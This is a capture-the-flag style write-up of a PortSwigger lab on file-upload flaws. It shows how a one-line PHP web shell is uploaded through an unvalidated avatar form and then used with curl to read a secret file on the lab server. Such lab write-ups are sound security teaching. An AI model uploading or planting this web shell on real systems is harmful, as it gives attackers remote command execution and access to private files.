# Remote code execution via web shell upload

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload), you'll learn: Remote code execution via web shell upload! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215234741.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215234759.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215234806.png)

**In the lab's background, it said:**

> This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

Now, If the application doesn't do any validation on user's file upload, an attack could upload a web shell to the web server's filesystem!

**But before we do that, let's upload a normal file, and intercept the request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215235217.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215235323.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215235345.png)

As you can see, when we clicked the `Upload` button, **a POST request will be sent to `/my-account/avatar`, with parameters `name`, `user`, `csrf`.**

**Let's forward that request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215235604.png)

It tells us the file has been uploaded, and **where does the file lives: `avatars/<filename>`.**

**Also, when we can go to the `My account` page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215235744.png)

**We can see the image file. Let's open that in new tab:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215235817.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221215235830.png)

Now we know **the exact location of the uploaded file: `/files/avatars/test.jpg`.**

**Armed with above information, we can try to upload some PHP web shells!**

**Payload:**
```php
<?php system($_GET['cmd']); ?>
```

This PHP web shell one-liner will execute any commands when we provide a GET parameter `cmd`.

**E.g: `webshell.php?cmd=id`**

**Now, let's upload that to the web application!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221216000504.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221216000517.png)

**Nice! Let's go to `/files/avatars/webshell.php?cmd=id`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1/images/Pasted%20image%2020221216000611.png)

**We now have Remote Code Execution(RCE)! Let's `cat` the `secret` file!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-1]
└─# curl https://0af000a203c4eff4c8e0246f00830085.web-security-academy.net/files/avatars/webshell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
yD3sebCja8SUTL8vy9XAIeKVHT5eWoc1
```

# What we've learned:

1. Remote code execution via web shell upload